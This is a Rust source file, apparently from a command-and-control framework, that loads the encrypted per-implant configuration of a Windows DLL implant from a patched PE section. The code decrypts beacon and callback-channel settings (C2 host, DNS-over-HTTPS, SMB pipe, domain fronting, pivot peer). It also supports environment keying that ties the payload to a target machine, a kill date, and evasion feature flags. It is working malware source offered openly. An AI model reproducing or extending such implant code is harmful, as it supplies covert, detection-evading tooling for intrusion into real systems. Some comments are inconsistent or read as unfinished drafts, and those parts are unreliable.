//! Runtime config loader from the `.nyx_cfg` PE section.
//!
//! The build-time DLL template carries a 1024-byte `.nyx_cfg` section filled
//! with `0xAA` (magic `0x41414141` = unpatched). At implant-generation time the
//! server patches this section with the per-implant config:
//!
//! ```text
//! [0xDEADBEEF magic (4B LE)]
//! [keying_levels    (4B LE)]  -- env-keying bitmap (0 = disabled)
//! [config_data_len  (2B LE)]  -- ct + tag bytes (N+16)
//! [config_nonce     (12B)]
//! [implant_priv     (32B)]    -- per-implant X25519 private key, XOR-masked
//!                                 with server_pub (H11: the raw scalar is not
//!                                 stored verbatim; unmasked at load time)
//! [server_pub       (32B)]    -- server's X25519 public key
//! [server_pub       (32B)]    -- server's X25519 public key
//! [encrypted_config (N B)]    -- ChaCha20-Poly1305 AEAD
//! [poly1305_tag     (16B)]
//! [padding to 1024B]
//! ```
//!
//! ## Key recovery
//!
//! `server_pub` is stored directly in the section (bytes 54..86).
//! `implant_priv` is stored XOR-masked with `server_pub` at bytes 22..54 (the
//! raw scalar is never written verbatim — see H11). The config key is derived
//! as:
//!
//! 1. config_key = ECDH(implant_priv, server_pub) + HKDF-SHA256
//!
//! If the section is unpatched (magic `0x41414141`), we fall back to the
//! compile-time config baked by `build.rs` — the dev/CI path.

#![cfg(target_os = "windows")]

use crate::heap::Vec;
use nyx_protocol::wire::Reader;

// ══════════════════════════════════════════════════════════════════════════════
// Config types
// ══════════════════════════════════════════════════════════════════════════════

/// Extra fields that may come from a per-implant (patched) config.
/// All fields are optional — compile-time builds have them all as `None`/`0`.
#[derive(Debug, Clone)]
pub struct ImplantConfig {
    /// One-time auth token (32 bytes) for first check-in validation.
    pub auth_token: Option<[u8; 32]>,
    /// Per-implant X25519 keypair (replaces per-session ephemeral generation).
    /// When set, the beacon loop uses this keypair instead of calling
    /// `ImplantKeypair::generate()`.
    pub implant_priv: Option<[u8; 32]>,
    /// Features bitmap (foliage, module_stomp, hwbp_blind, etc.).
    pub features_bitmap: u32,
    /// Number of environment keying HKDF layers (0 = disabled).
    pub keying_levels: u32,
    /// Unix timestamp after which the implant self-terminates (0 = no expiry).
    pub expires_at: u64,
}

impl Default for ImplantConfig {
    fn default() -> Self {
        Self {
            auth_token: None,
            implant_priv: None,
            features_bitmap: 0,
            keying_levels: 0,
            expires_at: 0,
        }
    }
}

/// Load the runtime config.
///
/// 1. Check if the `.nyx_cfg` section has been patched (magic `0xDEADBEEF`).
///    If so, derive the per-implant config key via ECDH+HKDF, decrypt the
///    config blob, decode the fields, and return them.
/// 2. If not patched (magic `0x41414141` or section missing), fall back to
///    the compile-time `config::load()`.
///
/// Returns `(Config, ImplantConfig, plaintext_bytes)`.
/// The caller MUST register the plaintext bytes with `mem::register_owned` to
/// keep them in maskable memory.
pub fn load_runtime_config() -> Option<(crate::config::Config, ImplantConfig, Vec<u8>)> {
    let (keying_levels, config_nonce, server_pub, implant_priv, ct_with_tag) =
        load_runtime_config_locate_ct()?;
    let plaintext = load_runtime_config_decrypt(
        keying_levels,
        &config_nonce,
        &server_pub,
        &implant_priv,
        ct_with_tag,
    )?;
    let parsed = load_runtime_config_parse_fields(&plaintext)?;
    Some(load_runtime_config_assemble(
        parsed,
        server_pub,
        implant_priv,
        keying_levels,
        plaintext,
    ))
}

/// Stage 4 — assemble the final `Config`/`ImplantConfig` from the parsed
/// fields and the recovered keying material.
fn load_runtime_config_assemble(
    parsed: (
        crate::heap::String,
        u16,
        crate::heap::String,
        u32,
        u8,
        bool,
        Option<[u8; 32]>,
        u32,
        u64,
        ChannelTail,
    ),
    server_pub: [u8; 32],
    implant_priv: [u8; 32],
    keying_levels: u32,
    plaintext: Vec<u8>,
) -> (crate::config::Config, ImplantConfig, Vec<u8>) {
    let (
        server_host,
        server_port,
        beacon_uri,
        sleep_seconds,
        jitter_pct,
        use_tls,
        auth_token,
        features_bitmap,
        expires_at,
        channel_tail,
    ) = parsed;
    let cfg = load_runtime_config_build_cfg(
        server_host,
        server_port,
        beacon_uri,
        server_pub,
        sleep_seconds,
        jitter_pct,
        use_tls,
        channel_tail,
    );
    let implant = ImplantConfig {
        auth_token,
        implant_priv: Some(implant_priv),
        features_bitmap,
        keying_levels,
        expires_at,
    };
    (cfg, implant, plaintext)
}

/// Build the compile-time `Config` from the parsed core fields plus the
/// channel-dispatcher tail.
fn load_runtime_config_build_cfg(
    server_host: crate::heap::String,
    server_port: u16,
    beacon_uri: crate::heap::String,
    server_pub: [u8; 32],
    sleep_seconds: u32,
    jitter_pct: u8,
    use_tls: bool,
    channel_tail: ChannelTail,
) -> crate::config::Config {
    let (
        primary_channel,
        fallback_bitmap,
        doh_resolver,
        smb_pipe_name,
        extc2_api_host,
        extc2_token,
        rotation_hosts,
        fronting_host,
        proxy_server,
        tcp_peer_host,
        tcp_peer_port,
    ) = channel_tail;
    crate::config::Config {
        server_host,
        server_port,
        beacon_uri,
        server_pub,
        sleep_seconds,
        jitter_pct,
        use_tls,
        primary_channel,
        fallback_bitmap,
        doh_resolver,
        smb_pipe_name,
        extc2_api_host,
        extc2_token,
        rotation_hosts,
        fronting_host,
        proxy_server,
        tcp_peer_host,
        tcp_peer_port,
    }
}

/// Stage 1 — locate the ciphertext in the `.nyx_cfg` section and recover the
/// keying material: `(keying_levels, config_nonce, server_pub, implant_priv,
/// ct_with_tag)`. `None` → the caller falls back to the compile-time config.
fn load_runtime_config_locate_ct() -> Option<(u32, [u8; 12], [u8; 32], [u8; 32], &'static [u8])> {
    let section: &'static [u8] =
        unsafe { core::slice::from_raw_parts(&NYX_CFG_PLACEHOLDER as *const u8, 1024) };
    let (keying_levels, config_nonce, data_len) = load_runtime_config_read_header(section)?;
    let (server_pub, implant_priv, ct_with_tag) =
        load_runtime_config_unmask_keys(section, data_len)?;
    Some((
        keying_levels,
        config_nonce,
        server_pub,
        implant_priv,
        ct_with_tag,
    ))
}

/// Parse the `.nyx_cfg` header: magic + env-keying bitmap + config data length
/// + nonce. `None` → the caller falls back to the compile-time config.
fn load_runtime_config_read_header(section: &[u8]) -> Option<(u32, [u8; 12], usize)> {
    // Read magic (4 bytes LE)
    let magic = u32::from_le_bytes([section[0], section[1], section[2], section[3]]);

    if magic == 0x41414141 {
        // Unpatched — fall back to compile-time config.
        return None;
    }

    if magic != 0xDEADBEEF {
        // Unknown magic — corrupt or hand-modified binary. Fall back.
        return None;
    }

    // Patched. Read env-keying bitmap (u32 LE at bytes 4-7).
    let keying_levels = u32::from_le_bytes([section[4], section[5], section[6], section[7]]);

    // Read config data length (u16 LE at bytes 8-9).
    let data_len = u16::from_le_bytes([section[8], section[9]]) as usize;
    if data_len == 0 || data_len > 900 {
        // Sanity: config data can't be empty or improbably large.
        return None;
    }

    // Read config nonce (12B at bytes 10-21).
    let config_nonce: [u8; 12] = section[10..22].try_into().ok()?;
    Some((keying_levels, config_nonce, data_len))
}

/// Recover the key material: `server_pub`, the XOR-unmasked `implant_priv`
/// (H11), and the ciphertext slice.
fn load_runtime_config_unmask_keys(
    section: &'static [u8],
    data_len: usize,
) -> Option<([u8; 32], [u8; 32], &'static [u8])> {
    // Read server_pub from section[54..86] FIRST (needed to unmask implant_priv).
    let mut server_pub = [0u8; 32];
    server_pub.copy_from_slice(&section[54..86]);

    // SECURITY (H11): implant_priv is stored XOR-masked with server_pub. Read
    // the masked bytes from section[22..54], then un-XOR with server_pub. The
    // server_pub read above MUST happen before this unmask step.
    let mut implant_priv = [0u8; 32];
    implant_priv.copy_from_slice(&section[22..54]);
    for i in 0..32 {
        implant_priv[i] ^= server_pub[i];
    }

    // Read encrypted config at bytes 86..86+data_len.
    if 86 + data_len > 1024 {
        return None;
    }
    let ct_with_tag = &section[86..86 + data_len];
    Some((server_pub, implant_priv, ct_with_tag))
}

/// Stage 2 — derive the config key (ECDH + HKDF-SHA256), apply the
/// environment-keying layers, and AEAD-decrypt the ciphertext.
/// `None` → the caller falls back to the compile-time config.
fn load_runtime_config_decrypt(
    keying_levels: u32,
    config_nonce: &[u8; 12],
    server_pub: &[u8; 32],
    implant_priv: &[u8; 32],
    ct_with_tag: &[u8],
) -> Option<Vec<u8>> {
    // Derive config_key via ECDH(implant_priv, server_pub) + HKDF-SHA256.
    let mut config_key = derive_config_key(implant_priv, server_pub)?;

    // Apply environment keying layers BEFORE decryption so the AEAD tag
    // check enforces the target environment.  If keying_levels is 0 this is
    // a no-op; otherwise each active layer mixes HKDF-SHA256 over the current
    // key and the environment-specific data.  Missing env data (PEB walk
    // failure) skips that layer gracefully.
    if keying_levels != 0 {
        crate::env_keying::apply_layers(&mut config_key, keying_levels);
    }

    // Decrypt with ChaCha20-Poly1305.
    decrypt_config(&config_key, config_nonce, ct_with_tag)
}

/// Stage 3 — parse the plaintext fields. Returns the core fields plus the
/// channel-dispatcher tail (itself parsed by [`load_runtime_config_parse_tail`]).
fn load_runtime_config_parse_fields(
    plaintext: &[u8],
) -> Option<(
    crate::heap::String,
    u16,
    crate::heap::String,
    u32,
    u8,
    bool,
    Option<[u8; 32]>,
    u32,
    u64,
    ChannelTail,
)> {
    // The plaintext contains: [server_host str][server_port u16][beacon_uri str]
    //   [sleep_seconds u32][jitter_pct u8][use_tls u8]
    //   [auth_token presence(0/1) + optional 32B]
    //   [features_bitmap u32][keying_levels u32][expires_at u64]
    let mut r = Reader::new(plaintext);
    let (server_host, server_port, beacon_uri, sleep_seconds, jitter_pct, use_tls) =
        load_runtime_config_parse_core(&mut r)?;

    let auth_token = load_runtime_config_parse_auth_token(&mut r)?;

    let features_bitmap = r.u32().ok()?;
    // keying_levels is read from the section header (unencrypted) above and is
    // authoritative.  The plaintext copy is consumed for backward compat with
    // older server builds that still embed it, but we discard the value.
    let _keying_levels_plain = r.u32().ok()?;
    let expires_at = load_runtime_config_kill_date(&mut r)?;

    let channel_tail = load_runtime_config_parse_tail(&mut r)?;
    Some((
        server_host,
        server_port,
        beacon_uri,
        sleep_seconds,
        jitter_pct,
        use_tls,
        auth_token,
        features_bitmap,
        expires_at,
        channel_tail,
    ))
}

/// Parse the fixed-width core fields: `[server_host str][server_port u16]
/// [beacon_uri str][sleep_seconds u32][jitter_pct u8][use_tls u8]`.
fn load_runtime_config_parse_core(
    r: &mut Reader,
) -> Option<(crate::heap::String, u16, crate::heap::String, u32, u8, bool)> {
    let server_host = r.str().ok()?;
    let server_port = r.u16().ok()?;
    let beacon_uri = r.str().ok()?;
    let sleep_seconds = r.u32().ok()?;
    let jitter_pct = r.u8().ok()?;
    let use_tls = r.u8().ok()? != 0;
    Some((
        server_host,
        server_port,
        beacon_uri,
        sleep_seconds,
        jitter_pct,
        use_tls,
    ))
}

/// Read the auth token: presence byte + optional 32B. `None` = decode error,
/// `Some(None)` = no token present.
fn load_runtime_config_parse_auth_token(r: &mut Reader) -> Option<Option<[u8; 32]>> {
    // Auth token: presence byte + optional 32B
    if r.remaining() > 0 {
        let has_token = r.u8().ok()?;
        if has_token == 1 {
            let b = r.blob().ok()?;
            if b.len() != 32 {
                return None;
            }
            let mut token = [0u8; 32];
            token.copy_from_slice(b);
            Some(Some(token))
        } else {
            Some(None)
        }
    } else {
        Some(None)
    }
}

/// Stage 4 — read the kill-date (`expires_at`, u64).
///
/// implant-beacon-6: a truncated extended tail fails the decode (→ compile-
/// time config fallback) instead of silently zeroing expires_at — the
/// kill-date must never be lost without a diagnostic.
fn load_runtime_config_kill_date(r: &mut Reader) -> Option<u64> {
    r.u64().ok()
}

/// Channel-dispatcher tail fields (spec-1):
/// `[primary_channel u8][fallback_bitmap u8][doh_resolver str]
/// [smb_pipe_name str][extc2_api_host str][extc2_token str]
/// [rotation_hosts str][fronting_host str][proxy_server str]
/// [tcp_peer_host str][tcp_peer_port u16]`.
type ChannelTail = (
    u8,
    u8,
    crate::heap::String,
    crate::heap::String,
    crate::heap::String,
    crate::heap::String,
    crate::heap::String,
    crate::heap::String,
    crate::heap::String,
    crate::heap::String,
    u16,
);

/// Parse the channel-dispatcher tail (spec-1). Old server-generated configs
/// stop after expires_at — `remaining()==0` → default to Https-only with
/// empty channel params.
fn load_runtime_config_parse_tail(r: &mut Reader) -> Option<ChannelTail> {
    if r.remaining() > 0 {
        load_runtime_config_parse_tail_present(r)
    } else {
        Some((
            0u8,
            0u8,
            crate::heap::String::new(),
            crate::heap::String::new(),
            crate::heap::String::new(),
            crate::heap::String::new(),
            crate::heap::String::new(),
            crate::heap::String::new(),
            crate::heap::String::new(),
            crate::heap::String::new(),
            0u16,
        ))
    }
}

/// Parse the present channel-dispatcher tail (spec-1), including the spec-7
/// HTTP enhancement and spec-3 raw pivot backward-compat layers.
fn load_runtime_config_parse_tail_present(r: &mut Reader) -> Option<ChannelTail> {
    let pc = r.u8().ok()?;
    let fb = r.u8().ok()?;
    let dr = r.str().ok()?;
    let sp = r.str().ok()?;
    let eh = r.str().ok()?;
    let et = r.str().ok()?;
    // spec-7 HTTP enhancement fields — further backward compat layer.
    let (rh, fh, ps) = if r.remaining() > 0 {
        (r.str().ok()?, r.str().ok()?, r.str().ok()?)
    } else {
        (
            crate::heap::String::new(),
            crate::heap::String::new(),
            crate::heap::String::new(),
        )
    };
    // spec-3 raw pivot fields — further backward compat layer.
    let (tcp_peer_host, tcp_peer_port) = if r.remaining() > 0 {
        (r.str().ok()?, r.u16().ok()?)
    } else {
        (crate::heap::String::new(), 0u16)
    };
    Some((
        pc,
        fb,
        dr,
        sp,
        eh,
        et,
        rh,
        fh,
        ps,
        tcp_peer_host,
        tcp_peer_port,
    ))
}

// ══════════════════════════════════════════════════════════════════════════════
// .nyx_cfg section — placeholder for server-side per-implant patching
// ══════════════════════════════════════════════════════════════════════════════
//
// This static materializes the `.nyx_cfg` PE section in the compiled DLL
// template. `load_runtime_config()` reads it directly via the
// `NYX_CFG_PLACEHOLDER` symbol address. The server's `generate_implant` finds
// it by scanning for the `0x41414141` magic + `0xAA` padding, then overwrites
// the section in-place with the per-implant config blob (`0xDEADBEEF` magic +
// implant_priv + server_pub + ciphertext).
//
// Layout (template / unpatched state):
//   bytes 0-3:    0x41414141 (magic — "not yet patched")
//   bytes 4-1023: 0xAA       (sentinel padding — lets the server confirm it
//                             found the right 1024-byte window)
//
// `#[used]` prevents the linker from discarding the symbol. `#[link_section]`
// places it in a dedicated PE section so the server can locate and patch a
// contiguous 1024-byte region without colliding with `.rdata` or `.text`.

#[used]
#[link_section = ".nyx_cfg"]
#[no_mangle]
pub static NYX_CFG_PLACEHOLDER: [u8; 1024] = {
    let mut buf = [0xAAu8; 1024];
    buf[0] = 0x41;
    buf[1] = 0x41;
    buf[2] = 0x41;
    buf[3] = 0x41;
    buf
};

/// Derive the per-implant config encryption key:
///   shared = X25519_ECDH(implant_priv, server_pub)
///   config_key = HKDF-SHA256(shared, "nyx-implant-config-v1",
///                            server_pub || implant_pub)
fn derive_config_key(implant_priv: &[u8; 32], server_pub: &[u8; 32]) -> Option<[u8; 32]> {
    use nyx_protocol::crypto;

    // Compute implant public key from private key
    let implant_pub = crypto::public_from_secret(implant_priv)?;

    // ECDH: implant_priv × server_pub → shared secret
    let shared = crypto::ecdh(implant_priv, server_pub)?;

    // HKDF-SHA256: info = server_pub || implant_pub
    let mut info = [0u8; 64];
    info[..32].copy_from_slice(server_pub);
    info[32..].copy_from_slice(&implant_pub);

    let mut okm = [0u8; 32];
    // okm is a fixed 32 bytes — far below the 8160-byte HKDF-Expand bound — so
    // OutputTooLong is structurally unreachable. We surface it as None (a
    // failed key derivation) rather than panicking; the caller
    // (load_runtime_config) returns None and the beacon falls back to the
    // compile-time config. Avoids the panic=abort abort the pre-fix
    // `.expect()` would have caused.
    crypto::hkdf_sha256(&shared, b"nyx-implant-config-v1", &info, &mut okm).ok()?;
    Some(okm)
}

/// ChaCha20-Poly1305 decrypt `ct_with_tag` (ciphertext || 16B tag) under
/// `key` and `nonce`. Returns the plaintext on success (AEAD tag verified),
/// or `None` on failure.
fn decrypt_config(key: &[u8; 32], nonce: &[u8; 12], ct_with_tag: &[u8]) -> Option<Vec<u8>> {
    if ct_with_tag.len() < 17 {
        return None; // too short for tag
    }
    // We need ChaCha20-Poly1305. The nyx-config crate has `decrypt`, but it
    // requires CONFIG_KEY, CONFIG_NONCE, CONFIG_CT as statics. We have runtime
    // values. Use the protocol crate's crypto primitives directly.
    //
    // The simplest approach: use chacha20poly1305 crate directly.
    // But we're in no_std. The nyx-config crate uses chacha20poly1305 with the
    // `aead` trait. Let's check if that's available.
    //
    // Actually, we can use the crypto::decrypt_config function that we'll add
    // to the protocol crate. For now, delegate to the crypto module.
    nyx_protocol::crypto::aead_decrypt(key, nonce, ct_with_tag)
}
